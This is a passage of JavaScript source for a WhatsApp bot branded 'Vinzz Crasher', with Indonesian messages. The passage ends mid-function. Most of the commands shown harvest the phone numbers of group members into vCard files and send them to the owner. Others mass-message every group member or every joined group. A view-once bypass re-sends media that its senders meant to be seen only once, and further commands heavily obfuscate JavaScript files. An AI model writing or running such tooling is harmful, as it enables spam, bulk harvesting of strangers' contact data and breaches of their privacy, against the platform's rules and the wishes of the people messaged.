            header: "⎋ Menu owner",
            title: "Menampilkan menu owner",
            description: "© By Vinzz",
            id: `.pushmenu`, 
          },
        ]},
        {
        title: `💻 panel menu`, 
        highlight_label: `Menu Panel`,
        rows: [
          {
            header: "⎋ Panel Menu",
            title: "Menampilkan Panel Menu",
            description: "© By Vinzz",
            id: `.panelmenu`, 
          },
        ]},
        {
        title: `🪀Report jika terjadi eror`, 
        highlight_label: `Rekomendasi`,
        rows: [
          {
            header: "⎋ Report Ke Owner",
            title: "Laporan Eror Ke Owner",
            description: "© By Vinzz",
            id: `.Report`, 
          },
        ]},
        {
        title: `🔥 Thank To`, 
        highlight_label: `Opsional`,
        rows: [
          {
            header: "⎋ VinzzOfficial",
            title: "Menampilkan Thank Tho",
            description: "© By Vinzz",
            id: `.tqto`,      
          },
        ]},
    ]
})
},
viewOnce: true
}
]

const buttonMessage = {
video: { url: "https://files.catbox.moe/ysvq2o.mp4" },
	    gifPlayback: false,
        caption: menubug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
                externalAdReply:{
                    title: `Vinzz͢ Crasher`,
                    body: `YT : VinzzOfficial_01`,
                    thumbnailUrl: `https://files.catbox.moe/4szg67.webp`,
                   showAdattribution: true,
mimeType: 1,
sourceUrl: 'https://whatsapp.com/channel/0029Vb8PXM73gvWUGGujbO0V',
lenderLargerThumbnail: true
            }
        },
        buttons: flowActions,
        viewOnce: true,
        headerType: 6
    };

return vinzzoffc.sendMessage(m.chat, buttonMessage, {
quoted: lampumerah
})

await vinzzoffc.sendMessage(m.chat, {audio: { url: "https://files.catbox.moe/x0rhmj.mp3" },mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}

break
case "savekontak": {
if (!isOwner) return m.reply(mess.owner)
if (!isGroup) return m.reply(mess.group)
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./Memory/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:BUYER AND SELLER FRESHH ${createSerial(2)}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./Memory/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`file kontak sudah di kirim ke private chat`)
await vinzzoffc.sendMessage(m.sender, { document: fs.readFileSync("./Memory/contacts.vcf"), fileName: "contacts.vcf", caption: "file kontaknya✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./Memory/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./Memory/contacts.vcf", "")
}}
break
case "savekontak2": {
if (!isOwner) return m.reply(mess.owner)
if (!text) return m.reply(example("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup"))
var idnya = text
var groupMetadataa
try {
groupMetadataa = await vinzzoffc.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./Memory/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:BUYER AND SELLER FRESHH ${createSerial(2)}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./Memory/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`file kontak sudah di kirim ke private chat`)
await vinzzoffc.sendMessage(m.sender, { document: fs.readFileSync("./Memory/contacts.vcf"), fileName: "contacts.vcf", caption: "file kontaknya✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./Memory/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./Memory/contacts.vcf", "")
}}
break
case "pushkontak": {
if (!isOwner) return m.reply(mess.owner)
if (!text) return m.reply(example("pesannya"))
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`sedang dalam perjalanan mengirim pesan ke *${halls.length}* member grup tersebut`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./Memory/contacts.json', JSON.stringify(contacts))
await vinzzoffc.sendMessage(mem, {text: teks}, {quoted: proxy})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:BUYER AND SELLER FRESHH ${createSerial(2)}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./Memory/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`berhasil mengirim pesan ke *${halls.length} member grup, cek file kontal berhasil di kirim ke private chat`)
await vinzzoffc.sendMessage(m.sender, { document: fs.readFileSync("./Memory/contacts.vcf"), fileName: "contacts.vcf", caption: "file kontaknya✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./Memory/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./Memory/contacts.vcf", "")
}}
break
case "pushkontak1": {
if (!isOwner) return m.reply(mess.owner)
if (!text) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var [idnya, teks] = text.split("|")
var groupMetadataa
try {
groupMetadataa = await vinzzoffc.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("idnya mana?")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`sedang dalam perjalanan mengirim pesan *${halls.length}* ke mem grup tersebut`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./Memory/contacts.json', JSON.stringify(contacts))
await vinzzoffc.sendMessage(mem, {text: teks}, {quoted: proxy})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:BUYER AND SELLER FRESHH ${createSerial(2)}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./Memory/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`berhasil mengirim pesan ke *${halls.length} grup, file kontak sudah di kirim`)
await vinzzoffc.sendMessage(m.sender, { document: fs.readFileSync("./Memory/contacts.vcf"), fileName: "contacts.vcf", caption: "file kontaknya✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./Memory/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./Memory/contacts.vcf", "")
}}
break
case "pushkontak2": {
if (!isOwner) return m.reply(mess.owner)
if (!text) return m.reply("*contoh :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return m.reply("*Contohnya Gini Lerr :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return m.reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return m.reply("Format Delay Tidak Valid")
if (!teks) return m.reply("*Contoh :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await vinzzoffc.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("idnya mana?")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`sedang dalam perjalanan mengirim pesan ke *${halls.length}* ke member grup tersebut`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./Memory/contacts.json', JSON.stringify(contacts))
await vinzzoffc.sendMessage(mem, {text: teks}, {quoted: proxy})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:BUYER AND SELLER FRESHH ${createSerial(2)}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./Memory/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`berhasil pushkontak ke *${halls.length}* cek file kontak sudah di kirim✅`)
await vinzzoffc.sendMessage(m.sender, { document: fs.readFileSync("./Memory/contacts.vcf"), fileName: "contacts.vcf", caption: "file kontaknya✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./Memory/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./Memory/contacts.vcf", "")
}}
break
case "pushkontak3": {
if (!isOwner) return reply(`kamu bukann owner`)

// Memeriksa format perintah
if (!text) return reply(example("idgc|jeda|namakontak|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return reply(example("idgc|jeda|namakontak|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup"))

var idnya = text.split("|")[0]         // ID grup
var delay = Number(text.split("|")[1]) // Jeda
var contactName = text.split("|")[2]   // Nama kontak
var teks = text.split("|")[3]          // Pesan yang dikirim

// Memeriksa format dan validasi input
if (!idnya.endsWith("@g.us")) return reply("*❌ Invalid Group ID!*\nPlease check and try again.\n\n> Vinzz Official")
if (isNaN(delay)) return reply("*❌ Invalid Delay Format!*\n⏱️ Please use the correct format and try again.\n\n> Vinzz Official")
if (!contactName || !teks) return reply("*Contoh Command :*\n.pushkontak3 idgc|jeda|namakontak|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")

var groupMetadataa
try {
groupMetadataa = await vinzzoffc.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*❌ Invalid Group ID!*\nPlease check and try again.\n\n> Vinzz Official")
}

const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)

// Mengirimkan notifikasi ke owner
await reply(`*⌛ Memproses Pengiriman Pesan.*\n📤 Mengirim pesan ke *${halls.length} contacts*...\n\n> Vinzz Official`)

// Mengirim pesan ke setiap kontak
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./Memory/contacts.json', JSON.stringify(contacts))
await vinzzoffc.sendMessage(mem, { text: teks }, { quoted: proxy })
await sleep(3500)
}
}
}
break
case "idgc": {
if (!isOwner) return m.reply(mess.owner)
if (!isGroup) return m.reply(mess.group)
m.reply(`${m.chat}`)
}
break
case "listgc": case "cekid": case"listgrup": {
let gcall = Object.values(await vinzzoffc.groupFetchAllParticipating().catch(_=> null))
let listgc = `*｢ LIST ALL CHAT GRUP ｣*\n\n`
await gcall.forEach((u, i) => {
listgc += `*• Nama :* ${u.subject}\n*• ID :* ${u.id}\n*• Total Member :* ${u.participants.length} Member\n*• Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n*• Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
m.reply(listgc)
}
break
case "jpmslide": {
if (!isOwner) return m.reply(mess.owner)
await vinzzoffc.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
let getGroups = await vinzzoffc.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await reply(`Memproses *jpmslide*`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(3500)
}
await vinzzoffc.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*`}, {quoted: proxy})
}
break
case "startjpm": {
if (!isOwner) return m.reply(mess.owner)
var teksnya = await fs.readFileSync("./Memory/teksjpm.js").toString()
if (teksnya.length < 1) return m.reply("Teks Jpm Tidak Ditemukan, Silahlan Isi/Edit Teks Jpm Didalam Folder all/database")
var teks = `${teksnya}`
let total = 0
let getGroups = await vinzzoffc.groupFetchAllParticipating()
let usergc = await Object.keys(getGroups)
m.reply(`memproses mengirim teks* ke *${usergc.length}* grup`)
for (let jid of usergc) {
try {
await vinzzoffc.sendMessage(jid, {text: teks}, {quoted: proxy})
total += 1
} catch {}
await sleep(4000)
}
m.reply(`berhasil mengirim teks ke *${total} grup*`)
}
break
case "jpmhidetag": {
if (!isOwner) return m.reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let getGroups = await vinzzoffc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`memproses mengirim *teks* ke *${usergc.length}* grup`)
for (let jid of usergc) {
try {
await vinzzoffc.sendMessage(jid, {text: teks, mentions: getGroups[jid].participants.map(e => e.id)}, {quoted: proxy})
total += 1
} catch (e) {
console.log(e)
}
await sleep(global.delayjpm)
}
m.reply(`berhasil mengirim teks polling *${total} grup*`)
}
break
case "tespol": {
if (!isOwner) return m.reply(mess.owner)
if (!text) return m.reply(example("teks1|teks2|teks3"))
if (!text.split("|")) return m.reply(example("teks1|teks2|teks3"))
let val = []
let anu = text.split("|")
let anu1 = anu[0]
let anu2 = anu.map(e => e !== 1 ? val.push(anu[e]) : "-")
await anu2.forEach(e => val.push(e))
vinzzoffc.sendPoll(m.chat, anu1, val)
}
break
case "jpmpol": case "jpmpoll": {
if (!isOwner) return m.reply(mess.owner)
if (!text) return m.reply(example("teks1|teks2|teks3"))
if (!text.split("|")) return m.reply(example("teks1|teks2|teks3"))
let val = []
let anu = text.split("|")
let anu1 = anu[0]
let anu2 = anu.map(e => e !== 1 ? val.push(anu[e]) : "-")
anu2.forEach(e => val.push(e))
let total = 0
let getGroups = await vinzzoffc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`memproses mengirim pesan *polling* ke *${usergc.length}* grup`)
for (let jid of usergc) {
try {
vinzzoffc.sendPoll(jid, anu1, val)
total += 1
} catch (e) {
console.log(e)
}
await sleep(4000)
}
m.reply(`berhasil pesan ke *${total} grup*`)
}
break
case "jpm": {
if (!isOwner) return m.reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let getGroups = await vinzzoffc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`memproses mengirim *teks* ke *${usergc.length}* grup`)
for (let jid of usergc) {
try {
await vinzzoffc.sendMessage(jid, {text: teks}, {quoted: proxy})
total += 1
} catch {}
await sleep(global.delayjpm)
}
m.reply(`berhasil mengirim *teks* ke *${total} grup*`)
}
break
case "jpm2": {
if (!isOwner) return m.reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan balas/kirim foto"))
let image = await vinzzoffc.downloadAndSaveMediaMessage(qmsg)
let total = 0
let getGroups = await vinzzoffc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`memproses mengirim *teks & foto* ke *${usergc.length}* grup`)
for (let jid of usergc) {
try {
vinzzoffc.sendMessage(jid, {image: await fs.readFileSync(image), caption: text, contextInfo: {forwardingScore: 1,
isForwarded: true}}, {quoted: proxy})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await fs.unlinkSync(image)
m.reply(`berhasil mengirim postingan *${total} grup*`)
}
break
case "jpmtesti": {
if (!isOwner) return m.reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan balas/kirim foto"))
let image = await vinzzoffc.downloadAndSaveMediaMessage(qmsg)
if (global.idchannel == "-") return m.reply('Isi Dulu ID Saluran Lu Di File Settings.js!')
let total = 0
let getGroups = await vinzzoffc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`Memproses Mengirim Pesan *Teks & Foto* Ke *${usergc.length}* Grup`)
for (let jid of usergc) {
try {
vinzzoffc.sendMessage(jid, {image: await fs.readFileSync(image), caption: text, contextInfo: {forwardingScore: 1,
isForwarded: true, forwardedNewsletterMessageInfo: {newsletterJid: global.idchannel, serverMessageId: 100, 
newsletterName: `tesimoni`
}}}, {quoted: proxy})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await fs.unlinkSync(image)
m.reply(`berhasil mengirim postingan *${total} grup*`)
}
break
case "setteksjpm": {
if (!isOwner) return m.reply(mess.owner)
if (text || m.quoted) {
const newteks = m.quoted ? m.quoted.text : text
await fs.writeFileSync("./Memory/teksjpm.js", newteks.toString())
m.reply("berhasil mengganti teks jpm✅")
} else {
return m.reply(example("dengan reply/kirim teks\n\nUntuk melihat teks jpm saat ini ketik *.teksjpm*"))
}}
break
case "teksjpm": {
m.reply(fs.readFileSync("./Memory/teksjpm.js").toString())
}

break
case "del": case "delete": {
await vinzzoffc.sendMessage(m.chat, {react: {text: '☑️', key: m.key}})
if (isGroup) {
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
vinzzoffc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
vinzzoffc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
vinzzoffc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break
case "+": case "cc": case "acc": {
if (!isGroup) return m.reply("*khusus Comunity vinzz ya adik adik 😂*")
if (!args[0]) return m.reply("62838XXX")
var teks = text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var cek = await vinzzoffc.onWhatsApp(`${teks.split("@")[0]}`)
if (cek.length < 1) return m.reply("nomor tidak terdaftar di whatsapp!")
var a = await vinzzoffc.groupParticipantsUpdate(m.chat, [teks], '+')
if (a[0].status == 200) return m.reply(`Berhasil Menambahkan ${teks.split("@")[0]} Kedalam Grup Ini`)
if (a[0].status == 408) return m.reply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
if (a[0].status == 409) return m.reply(`Dia Sudah Ada Di Dalam Grup Ini!`)
if (a[0].status == 403) return m.reply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
}
break
case "public": {
await vinzzoffc.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
vinzzoffc.public = true
VinzzReply("public mode activated!")
}
break
case "self": {
await vinzzoffc.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
vinzzoffc.public = false
VinzzReply("self mode activated!")
}
break
case "owner": {
vinzzoffc.sendContact(m.chat, [owner], "nomor owner✅", m)
}
break
case "developer": case "creator": {
vinzzoffc.sendContact(m.chat, [`${owner[0].split("@")[0]}`], "Developer Bot", m)
}
break
case "promote": case "promot": {
if (!isGroup) return m.reply (" ⚠️*Khusus Comunity Private Vinzz*")
if (!isBotAdmin) return m.reply(`*Bot Bukan Admin Grup!`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await vinzzoffc.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => m.reply(`_berhasil menjadikan ${target.split("@")[0]} sebagai admin grup_`)).catch((err) => m.reply(err.toString()))
} else return m.reply(`*Example* .${command},62838XXX`)}
break
case "demote": case "demote": {
if (!isGroup) return m.reply(`*Fitur Khusus Group!*`)
if (!isBotAdmin) return m.reply(`*Bot Bukan Admin Grup!*`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await vinzzoffc.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => m.reply(`_berhasil memberhentikan si anjing ${target.split("@")[0]} sebagai admin grup_`)).catch((err) => m.reply(err.toString()))
} else return m.reply('62838XXX')
}
break
case "open": {
if (!isGroup) return m.reply(`*Only Group Ler!*`)
if (!isBotAdmin) return m.reply(`*Bot Bukan Admin Grup!*`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '🔓', key: m.key}})
await vinzzoffc.groupSettingUpdate(m.chat, 'not_announcement')
m.reply("succes")
}
break
case "close": {
if (!isGroup) return m.reply(`*Only Group Ler!*`)
if (!isBotAdmin) return m.reply(`*Bot Bukan Admin Grup!*`)
await vinzzoffc.sendMessage(m.chat, {react: {text: '🔒', key: m.key}})
await vinzzoffc.groupSettingUpdate(m.chat, 'announcement')
m.reply("succes")
}
break
case "hidetag": case "h": {
await vinzzoffc.sendMessage(m.chat, {react: {text: '♾️', key: m.key}})
if (!isGroup) return reply("*khusus Comunity vinzz ya adik adik 😂*")
if (!m.quoted && !text) return VinzzReply("teksnya/replyteks")
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
vinzzoffc.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "leave": {
if (!isGroup) return reply("*khusus Comunity vinzz ya adik adik 😂*")
await vinzzoffc.sendMessage(m.chat, {react: {text: '⏱️', key: m.key}})
await VinzzReply("Baik, bot akan pergi meninggalkan grup👋")
await sleep(300)
await vinzzoffc.groupLeave(m.chat)
}
break
case "restart": case "rst": {
if (!isGroup) return reply("*khusus Comunity vinzz ya adik adik 😂*")
await VinzzReply("_botz sedang di restart, mohon untuk menunggu_. . .")
await vinzzoffc.sendMessage(m.chat, {react: {text: '🔁', key: m.key}})
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
await sleep(1000);
await vinzzoffc.sendMessage(m.chat, {react: {text: '⌛', key: m.key}})
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
await sleep(1000);
await VinzzReply("_succes restart bot_...")
await vinzzoffc.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
}}
break
case "k": case "kik": case "kick": {
if (!isGroup) return reply("*khusus Comunity vinzz ya adik adik 😂*")
if (!text) return m.reply(`*Example* .${command},username`)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await vinzzoffc.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => vinzzoffc.sendMessage(m.chat, {text: `berhasil mengeluarkan @${users.split("@")[0]} dari grup`, mentions: [`${users}`]}, {quoted: m})).catch((err) => VinzzReply(err.toString()))
}}
break
case 'sticker':
case 's':
case 'stiker': {
    if (!quoted) return VinzzReply(`reply image/video dengan caption ${prefix + command}`);
    try {
        if (/image/.test(mime)) {
            const media = await quoted.download();
            const imageUrl = `data:${mime};base64,${media.toString('base64')}`;
            await makeStickerFromUrl(imageUrl, vinzzoffc, m);
        } else if (/video/.test(mime)) {
            if ((quoted?.msg || quoted)?.seconds > 10) return VinzzReply('Durasi video maksimal 10 detik!')
                const media = await quoted.download();
                const videoUrl = `data:${mime};base64,${media.toString('base64')}`;
                await makeStickerFromUrl(imageUrl, vinzzoffc, m);
            } else {
                return VinzzReply('Kirim gambar/video dengan caption .s (video durasi 1-10 detik)');
            }
        } catch (error) {
            console.error(error);
            return VinzzReply('Terjadi kesalahan saat memproses media. Coba lagi.');
        }
    }
break
case "tourl": {
if (!/image/.test(mime)) return reply(`*Example* .${command} 𝗥𝗲𝗽𝗹𝘆/𝗞𝗶𝗿𝗶𝗺 𝗙𝗼𝘁𝗼`)
let media = await vinzzoffc.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'VinzzOfficial.png');

let teks = directLink.toString()
await vinzzoffc.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break
case 'tohd': case "hd": case 'remini': {
if (!/image/.test(mime)) return VinzzReply(`*Example* .${command}dengan kirim/reply foto`)
let foto = await vinzzoffc.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await vinzzoffc.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break
case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(`*Example* .${command} dengan reply pesannya`)
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return vinzzoffc.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return vinzzoffc.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return vinzzoffc.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
case "enc": case "encrypt": {
if (!m.quoted) return m.reply(`*Example* .${command} dengan reply file .js`)
if (mime !== "application/javascript") return m.reply(`*Example* .${command}dengan reply file .js`)
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./database/sampah/${filename}`, media)
await m.reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./database/sampah/${filename}`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./database/sampah/${filename}`, obfuscated)
  await vinzzoffc.sendMessage(m.chat, {document: fs.readFileSync(`./database/sampah/${filename}`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt file sukses ✅"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
  await fs.unlinkSync(`./database/sampah/${filename}`)
}
break
case "enchard": case "encrypthard": {
if (!m.quoted) return m.reply("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await m.reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "/*VinzzOfficial/*^/*($break)*/" + 
            "/*VinzzOfficial/*^/*($break)*/";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
